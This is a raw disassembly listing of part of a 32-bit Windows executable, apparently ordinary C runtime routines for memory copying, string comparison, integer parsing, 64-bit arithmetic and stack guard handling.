  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
